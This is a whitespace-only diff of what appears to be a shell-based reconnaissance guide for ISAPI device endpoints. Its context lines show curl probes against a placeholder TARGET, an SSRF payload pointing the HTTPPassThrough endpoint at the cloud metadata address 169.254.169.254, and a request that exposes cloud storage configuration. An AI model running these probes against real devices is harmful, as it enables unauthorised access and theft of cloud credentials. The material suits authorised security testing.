@@ -117,10 +117,10 @@ for path in "${ISAPI_PATHS[@]}"; do
   response=$(curl --max-time 30 --connect-timeout 10 -sk -w "\n%{http_code}" "https://TARGET:PORT$path" 2>/dev/null)
   code=$(echo "$response" | tail -1)
   body=$(echo "$response" | head -n -1)
-  
+
   echo "=== $path ($code) ==="
   echo "$body" | head -5
-  
+
   # Decode error codes
   if echo "$body" | grep -q "ErrorCode"; then
     error=$(echo "$body" | grep -Po 'ErrorCode\"?\s*[:\s]*(\d+)' | grep -Po '\d+')
@@ -195,7 +195,7 @@ Prioritize these endpoints which may enable SSRF, data access, or privilege esca
 # HTTP pass-through (potential SSRF)
 curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V1/DAM/HTTPPassThrough" \
   -H "Content-Type: application/json" \
-  -d '{"url":"http://169.254.169.254/"}' 
+  -d '{"url":"http://169.254.169.254/"}'
 
 # Cloud storage configuration exposure
 curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V1/Storage/LocalCloudStorageConfig"
